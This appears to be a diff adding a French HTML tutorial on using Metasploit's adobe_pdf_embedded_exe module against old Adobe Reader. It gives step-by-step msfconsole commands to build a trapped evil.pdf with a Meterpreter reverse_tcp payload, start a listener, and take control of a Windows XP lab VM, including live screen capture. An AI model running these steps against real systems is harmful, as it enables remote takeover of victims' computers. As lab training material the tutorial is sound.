@@ -1,0 +1,123 @@
+<h2 class="mb-3">1. Découverte</h2>
+                <p >
+                    Bienvenue à toi jeune Hacker en herbe. Dans ce tutoriel on va découvrir un des couteaux suisses que tout bon pentester se doit d’avoir dans son pc. MetaSploit est ce que l’on peut qualifier de « Framework d’exploitation » semi Open Source. 
+                    En gros c’est un cadre de travail qui apporte les ressources nécessaires pour développer et exécuter des « exploits ». 
+                    MetaSploit est un outil possédant une version gratuite et très polyvalent. Dans ce tutoriel nous nous concentrerons sur les fonctionnalités liées à la mise en place d’un « Reverse Shell ». 
+                </p>
+
+                <h2 class="mb-3">2. Objectif</h2>
+                <p >
+                    L'objectif de ce tutoriel est de vous présenter le module adobe_pdf_embedded_exe de msfconsole.
+                    </br>
+                    Nous allons voir comment exploiter une vulnérabilité présente sur les versions d'Adobe Reader < 10.x pour initialiser une connexion sur le poste de la victime et installer meterpreter sur celui-ci afin d'en prendre le controle à distance.
+                </p>
+                
+                <h2 class="mb-3">3. Installation</h2>
+                <p >
+                    MetaSploit est fourni de base avec les distributions linux orientées pentest (Kali, Parrot). 
+                    Cependant si vous disposez d’une distribution plus « classique » ou bien si vous êtes sous Windows alors il vous faudra vous rendre sur ce site et suivre la procédure d’installation qui y est décrite : <a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">Installation</a>      
+                </p>
+
+                <h2 class="mb-3">4. Utilisation</h2>
+                <p >
+                    <h3>Création du PDF avec MetaSploit</h3>
+                    <br/>
+                    Ouvrez un terminal dans votre système d’exploitation et lancez msfconsole 
+                    <br/>
+                    Le fonctionnement de MetaSploit repose sur la définition de ce que nous souhaitons utiliser. C’est pour cela qu’avec les commandes suivantes nous allons définir l’exploit que nous souhaitons utiliser ainsi que la <span style="font-weight: bold;">charge</span>
+                     (ou payload) que nous voulons exécuter sur la machine cible. Il convient aussi de définir certains paramètres essentiels tels que l’adresse IP sur laquelle la machine cible devra établir une connexion <span style="font-style:italic;">(on cherche à mettre en place une connexion type 
+                     <span style="font-weight: bold;">reverse</span> tcp c’est à dire que c’est la machine cible qui vient demander à se connecter à l’attaquant. Dans le cas contraire on aurait parlé de connexion type <span style="font-weight: bold;">bind</span> tcp).</span> 
+                    <br/>
+                    Tapez puis validez : <kbd class="ms-3">use exploit/windows/fileformat/adobe_pdf_embedded_exe </kbd>
+                    <br/>
+                    Tapez puis validez : <kbd class="ms-3">show options</kbd>
+                    <br/>
+                    Cette commande vous permet de voir les différents paramètres à configurer pour utiliser le module.
+                    <br/>
+                    Tapez puis validez : <kbd class="ms-3">set lhost [votre adresse IP] </kbd>
+                    <br/>
+                    Pour connaitre votre adresse IP : Sous windows => ipconfig dans le cmd / Sous Linux => ifconfig dans le terminal 
+                    <br/>
+                    Tapez puis validez : <kbd class="ms-3">set payload windows/meterpreter/reverse_tcp</kbd> 
+                    <br/>
+                    Tapez puis validez : <kbd class="ms-3">exploit</kbd>
+                    <br/>
+                </p>
+                    <img src="./images/pdf_reverse/1.png" style="width: 100%;"/>
+                    <img src="./images/pdf_reverse/2.png" style="width: 100%;"/>
+                    <img src="./images/pdf_reverse/3.png" style="width: 100%;"/>
+                    <img src="./images/pdf_reverse/4.png" style="width: 100%;"/>
+
+                <p>
+
+                    <h3>Mise en place d'un Handler</h3>
+                    <br/>
+                    Désormais notre PDF infecté est créé et stocké dans le dossier indiqué par l’avant dernière ligne du terminal : evil.pdf stored at /home/[Votre nom d’utilisateur]/.msf4/local/evil.pdf  
+                    <br/>
+                    Il faut maintenant paramétrer MetaSploit pour qu’il se mette en attente d’une connexion entrante provenant de la machine infectée. 
+                    <br/>
+                    A la suite dans le précédent terminal tapez puis validez : <kbd class="ms-3">use exploit/multi/handler </kbd>
+                    <br/>
+                    Tapez puis validez : <kbd class="ms-3">set lhost [Votre adresse IP] </kbd>
+                    <br/>
+                    Cette commande vous permet de voir les différents paramètres à configurer pour utiliser le module.
+                    <br/>
+                    Tapez puis validez : <kbd class="ms-3">set payload windows/meterpreter/reverse_tcp </kbd>
+                    <br/>
+                    Tapez puis validez : <kbd class="ms-3">exploit</kbd> 
+                </p>
+                    <img src="./images/pdf_reverse/5.png" style="width: 100%;"/>
+                <p>
+                    A présent il faut laisser ce terminal ouvert et attendre qu’une victime ouvre le PDF piégé. 
+                    <br/>
+                </p>
+
+                    <h2 class="mb-3">5. Mise en place de la machine virtuelle cible</h2>
+                    <p >
+                        
+                        Pour réaliser cet exploit, il va vous falloir une machine virtuelle pour simuler une machine cible. Il faut savoir que tous les exploits ne fonctionnent pas sur toutes les machines. 
+                        Aussi pour cet exploit les machines cibles sont d’après MetaSploit des machines qui tournent sous WINDOWS XP SP3 et ayant une version d’Adobe Reader v8.x et v9.x 
+                        </br>
+                        Pour mettre en place la VM vous avez deux options : VMWare ou VirtualBox 
+                        </br>
+                        Voici les liens d’installation :  
+                        </br>
+                        <a href="https://www.virtualbox.org/wiki/Downloads"><u>VirtualBox</u></a>
+                        </br>
+                        <a href="https://www.vmware.com/products/workstation-player.html"><u>VMWare</u></a>
+                        </br>
+                        Une fois que vous avez installé un de ces deux outils il faudra récupérer l’image disque correspondante :
+                        <br/>
+                        <a href="https://archive.org/details/WinXPProSP3x86"><u>Image disque windows XP SP3</u></a>
+                        </br>
+                        Une fois l’image disque installée il faudra que vous installiez une version vulnérable d'adobe reader (disponible <a href="https://adobe-reader.updatestar.com/en/edit/8.2.0">ici</a>) et que vous
+                        envoyiez votre PDF piégé sur la VM (glisser déposer, vnc, dossier partagé, clé usb,…) 
+                        </br>
+                        Maintenant vous n’avez plus qu’à ouvrir le PDF et admirer le résultat sur la console msf 
+                    </p>
+                        <img src="./images/pdf_reverse/6.png" style="width: 100%;"/>
+                    <p>
+                        Double clique sur le pdf evil puis validez l’enregistrement du pdf dans la boite de dialogue qui s’est ouverte.
+                        <br/>
+                        Enfin cliquez sur open lorsque que vous voyez le message suivant : 
+                    </p>
+                        <img src="./images/pdf_reverse/7.png" style="width: 100%;"/>
+                    <p>
+                        Vous devriez obtenir les lignes suivantes dans le terminal msf, ce qui signifie que l’exploitation est réussie : 
+                    </p>
+                        <img src="./images/pdf_reverse/8.png" style="width: 100%;"/>
+                    <p>
+                        Pour vous assurer du bon fonctionnement de l’exploit vous pouvez tapez la commande : <kbd>screenshare</kbd> 
+                        <br/>
+                        Une page internet devrait s’ouvrir avec un flux vidéo de l’écran de la machine cible en live.
+                        <br/>
+                        Vous avez désormais un accès à la machine cible, tapez la commande help pour voir l’étendue des options qui s’offrent à vous. 
+                        <br/>
+                        Sources : 
+                        <br/>
+                        <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/fileformat/adobe_pdf_embedded_exe.md"><u>https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/fileformat/adobe_pdf_embedded_exe.md</u></a>
+                        <br/>
+                        <a href="http://www.oldversion.com/windows/acrobat-reader-8-2-0"><u>http://www.oldversion.com/windows/acrobat-reader-8-2-0</u></a>
+                        <br/>
+                        <a href="https://archive.org/details/WinXPProSP3x86"><u>https://archive.org/details/WinXPProSP3x86</u></a>
+                    </p> 
